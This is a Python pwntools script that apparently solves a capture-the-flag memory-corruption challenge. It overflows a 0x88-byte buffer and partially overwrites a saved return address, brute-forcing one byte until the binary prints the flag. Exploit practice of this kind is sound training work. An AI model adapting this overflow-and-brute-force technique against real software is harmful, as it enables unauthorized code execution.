from pwn import *
import random

# Set the context for the binary
context.log_level='debug'
context.arch = 'amd64'
context.bits = 64
context.terminal = ['tmux', 'splitw', '-v']

# Constants
BUFFER_SIZE = 0x88
MAX_TRIES = 1000

# Create a list with values from 0x00 to 0xf0 stepping by 0x10
byte_table = [i for i in range(0x00, 0x100, 0x10)]

tries = 0

# Brute-forcing the least significant byte
while tries < MAX_TRIES:
    proc = process(["/challenge/babymem_level8.1"])
    
    # Construct the payload
    random_byte = random.choice(byte_table)
    payload = b'\x00' + (BUFFER_SIZE - 1) * b'A' + p8(0x5e) + p8(random_byte)
    
    proc.sendlineafter("Payload size:", str(BUFFER_SIZE + 8))
    proc.sendafter("bytes)!\n", payload)
    
    response = proc.recv()
    if b'flag' in response:
        print("[+] Exploit succeeded!")
        print(response)
        break
    
    proc.close()
    tries += 1

if tries == MAX_TRIES:
    print("[-] Exploit failed after max tries.")

